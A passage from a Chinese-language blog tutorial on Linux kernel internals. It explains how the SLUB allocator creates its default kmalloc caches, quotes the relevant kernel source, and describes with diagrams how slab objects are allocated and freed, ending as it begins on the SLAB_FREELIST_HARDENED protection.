class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>

<p>创建默认的 <code>kmem_cache</code> 过程存在如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x86_64_start_kernel()</span><br><span class="line">    x86_64_start_reservations()</span><br><span class="line">        start_kernel()</span><br><span class="line">            mm_init()</span><br><span class="line">                kmem_cache_init()</span><br><span class="line">                    create_kmalloc_caches()</span><br><span class="line">                        new_kmalloc_cache()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>new_kmalloc_cache</code> 中根据 <code>kmalloc_info</code> 的信息创建对应的 <code>kmalloc_cache</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init</span><br><span class="line"><span class="title function_">new_kmalloc_cache</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> type, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == KMALLOC_RECLAIM) &#123;</span><br><span class="line">		flags |= SLAB_RECLAIM_ACCOUNT;</span><br><span class="line">		name = kmalloc_cache_name(<span class="string">&quot;kmalloc-rcl&quot;</span>,</span><br><span class="line">						kmalloc_info[idx].size);</span><br><span class="line">		BUG_ON(!name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		name = kmalloc_info[idx].name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kmalloc_caches[type][idx] = create_kmalloc_cache(name,</span><br><span class="line">					kmalloc_info[idx].size, flags, <span class="number">0</span>,</span><br><span class="line">					kmalloc_info[idx].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看到默认创建的 <code>kmem_cache</code> 的地址被保存在 <code>kmalloc_caches</code> 因此可以通过该结构获得 <code>kmem_cache</code> 的地址，从而获取到重要调试信息，比如 <code>freelist</code> 在 <code>object</code> 中的偏移 <code>offset</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241115134915853.png"
                      alt="image-20241115134915853"
                ></p>
<p><code>create_kmalloc_cache</code> 函数调用了核心函数 <code>create_boot_cache</code> ，之后 <code>list_add</code> 将创建的 <code>kmem_cache</code> 加入到 <code>slab_caches</code> 链表中。内核全局有一个 <code>slab_caches</code> 变量，它是一个链表，系统所有的 <code>kmem_cache</code> 都接在这个链表上。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *__init <span class="title function_">create_kmalloc_cache</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> kmem_cache_zalloc(kmem_cache, GFP_NOWAIT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		panic(<span class="string">&quot;Out of memory when creating slab %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">	create_boot_cache(s, name, size, flags, useroffset, usersize);</span><br><span class="line">	list_add(&amp;s-&gt;<span class="built_in">list</span>, &amp;slab_caches);</span><br><span class="line">	memcg_link_cache(s);</span><br><span class="line">	s-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>create_boot_cache</code> 初始化了相关信息，之后调用 <code>__kmem_cache_create</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">create_boot_cache</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	s-&gt;name = name;</span><br><span class="line">	s-&gt;size = s-&gt;object_size = size;</span><br><span class="line">	s-&gt;align = calculate_alignment(flags, ARCH_KMALLOC_MINALIGN, size);</span><br><span class="line">	s-&gt;useroffset = useroffset;</span><br><span class="line">	s-&gt;usersize = usersize;</span><br><span class="line"></span><br><span class="line">	slab_init_memcg_params(s);</span><br><span class="line"></span><br><span class="line">	err = __kmem_cache_create(s, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		panic(<span class="string">&quot;Creation of kmalloc slab %s size=%u failed. Reason %d\n&quot;</span>,</span><br><span class="line">					name, size, err);</span><br><span class="line"></span><br><span class="line">	s-&gt;refcount = <span class="number">-1</span>;	<span class="comment">/* Exempt from merging for now */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>__kmem_cache_create</code> 调用了 <code>kmem_cache_open</code> 函数，该函数做了很多重要的初始化操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * calculate_sizes() determines the order and the distribution of data within</span></span><br><span class="line"><span class="comment"> * a slab object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">calculate_sizes</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> forced_order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Round up object size to the next word boundary. We can only</span></span><br><span class="line"><span class="comment">	 * place the free pointer at word boundaries and this determines</span></span><br><span class="line"><span class="comment">	 * the possible location of the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine if we can poison the object itself. If the user of</span></span><br><span class="line"><span class="comment">	 * the slab may touch the object after free or before allocation</span></span><br><span class="line"><span class="comment">	 * then we should never poison the object itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_POISON) &amp;&amp; !(flags &amp; SLAB_TYPESAFE_BY_RCU) &amp;&amp;</span><br><span class="line">			!s-&gt;ctor)</span><br><span class="line">		s-&gt;flags |= __OBJECT_POISON;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		s-&gt;flags &amp;= ~__OBJECT_POISON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are Redzoning then check if there is some space between the</span></span><br><span class="line"><span class="comment">	 * end of the object and the free pointer. If not then add an</span></span><br><span class="line"><span class="comment">	 * additional word to have some bytes to store Redzone information.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_RED_ZONE) &amp;&amp; size == s-&gt;object_size)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * With that we have determined the number of bytes in actual use</span></span><br><span class="line"><span class="comment">	 * by the object. This is the potential offset to the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;inuse = size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((flags &amp; (SLAB_TYPESAFE_BY_RCU | SLAB_POISON)) ||</span><br><span class="line">		s-&gt;ctor)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Relocate free pointer after the object if it is not</span></span><br><span class="line"><span class="comment">		 * permitted to overwrite the first word of the object on</span></span><br><span class="line"><span class="comment">		 * kmem_cache_free.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is the case if we do RCU, have a constructor or</span></span><br><span class="line"><span class="comment">		 * destructor or are poisoning the objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;offset = size;</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_STORE_USER)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Need to store information about allocs and frees after</span></span><br><span class="line"><span class="comment">		 * the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> track);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	kasan_cache_create(s, &amp;size, &amp;s-&gt;flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Add some empty padding so that we can catch</span></span><br><span class="line"><span class="comment">		 * overwrites from earlier objects rather than let</span></span><br><span class="line"><span class="comment">		 * tracking information or the free pointer be</span></span><br><span class="line"><span class="comment">		 * corrupted if a user writes before the start</span></span><br><span class="line"><span class="comment">		 * of the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">		s-&gt;red_left_pad = <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">		s-&gt;red_left_pad = ALIGN(s-&gt;red_left_pad, s-&gt;align);</span><br><span class="line">		size += s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SLUB stores one object immediately after another beginning from</span></span><br><span class="line"><span class="comment">	 * offset 0. In order to align the objects we have to simply size</span></span><br><span class="line"><span class="comment">	 * each object to conform to the alignment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, s-&gt;align);</span><br><span class="line">	s-&gt;size = size;</span><br><span class="line">	<span class="keyword">if</span> (forced_order &gt;= <span class="number">0</span>)</span><br><span class="line">		order = forced_order;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line">	<span class="keyword">if</span> (oo_objects(s-&gt;oo) &gt; oo_objects(s-&gt;max))</span><br><span class="line">		s-&gt;max = s-&gt;oo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (disable_higher_order_debug) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Disable debugging flags that store metadata if the min slab</span></span><br><span class="line"><span class="comment">		 * order increased.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (get_order(s-&gt;size) &gt; get_order(s-&gt;object_size)) &#123;</span><br><span class="line">			s-&gt;flags &amp;= ~DEBUG_METADATA_FLAGS;</span><br><span class="line">			s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">				<span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">	<span class="keyword">if</span> (system_has_cmpxchg_double() &amp;&amp; (s-&gt;flags &amp; SLAB_NO_CMPXCHG) == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* Enable fast mode */</span></span><br><span class="line">		s-&gt;flags |= __CMPXCHG_DOUBLE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The larger the object size is, the more pages we want on the partial</span></span><br><span class="line"><span class="comment">	 * list to avoid pounding the page allocator excessively.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_min_partial(s, ilog2(s-&gt;size) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	set_cpu_partial(s);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	s-&gt;remote_node_defrag_ratio = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize the pre-computed randomized freelist if slab is up */</span></span><br><span class="line">	<span class="keyword">if</span> (slab_state &gt;= UP) &#123;</span><br><span class="line">		<span class="keyword">if</span> (init_cache_random_seq(s))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!init_kmem_cache_nodes(s))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alloc_kmem_cache_cpus(s))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	free_kmem_cache_nodes(s);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">		panic(<span class="string">&quot;Cannot create slab %s size=%u realsize=%u order=%u offset=%u flags=%lx\n&quot;</span>,</span><br><span class="line">		      s-&gt;name, s-&gt;size, s-&gt;size,</span><br><span class="line">		      oo_order(s-&gt;oo), s-&gt;offset, (<span class="type">unsigned</span> <span class="type">long</span>)flags);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/f7f490f6f668b542aab003ec27135ad2.png"
                      alt="f7f490f6f668b542aab003ec27135ad2"
                ></p>
<ul>
<li><p>kmem_cache 刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个 slab ，如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/244cd82a22db3cb5168651580d622465-1731649943372-8.png"
                      alt="244cd82a22db3cb5168651580d622465"
                ></p>
</li>
<li><p>如果正在使用的 slab 有 free obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/df0e27a7cc01c0a1ab1b387409d7b8a4.png"
                      alt="df0e27a7cc01c0a1ab1b387409d7b8a4"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表中有可用 slab 用于分配，那么就会从 per cpu partial 链表中取下一个 slab 用于分配 obj。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/3b2a9a9ff98bb492fa0cfef2dc1490f6.png"
                      alt="3b2a9a9ff98bb492fa0cfef2dc1490f6"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表也为空，此时发现 per node partial 链表中有可用 slab 用于分配，那么就会从 per node partial 链表中取下一个 slab 用于分配 obj。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e9439ea41be5d91a1bc8789c50e098ff.png"
                      alt="6.png"
                ></p>
</li>
</ul>
<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/06ab07e03d42cc6bd7f1079a157d0c6f.png"
                      alt="06ab07e03d42cc6bd7f1079a157d0c6f"
                ></p>
<ul>
<li>假设下图左边的情况下释放 obj，如果满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/8ee336b6de8e8263a5dfa2dad69c99dc.png"
                      alt="8ee336b6de8e8263a5dfa2dad69c99dc"
                ></li>
<li>假设下图左边的情况下释放 obj，如果不满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/11bad950de73843bef8e1716a85bdb0c.png"
                      alt="11bad950de73843bef8e1716a85bdb0c"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果满足 per cpu partial 管理的所有 slab 的 free object 数量大于  kmem_cache 的 cpu_partial 成员的话的话，将 per cpu partial 链表管理的所有 slab 移动到 per  node partial 链表管理，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/583c765a6df44d6ffd56e4f506174318.png"
                      alt="583c765a6df44d6ffd56e4f506174318"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果不满足 per cpu partial 管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial 成员的话的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/0dc462afb4eebcf420803eca2491f169.png"
                      alt="11.png"
                ></li>
</ul>
<h4 id="内核堆保护"><a href="#内核堆保护" class="headerlink" title="内核堆保护"></a>内核堆保护</h4><h5 id="SLAB-FREELIST-HARDENED"><a href="#SLAB-FREELIST-HARDENED" class="headerlink" title="SLAB_FREELIST_HARDENED"></a>SLAB_FREELIST_HARDENED</h5><p><code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 编译选项开启 Hardened freelist 保护。在这个配置下，<code>kmem_cache</code> 增加了一个变量 <code>random</code> 。在 <code>mm/slub.c</code> 文件， <code>kmem_cache_open</code> 的时候给 <code>random</code> 字段一个随机数。</p>
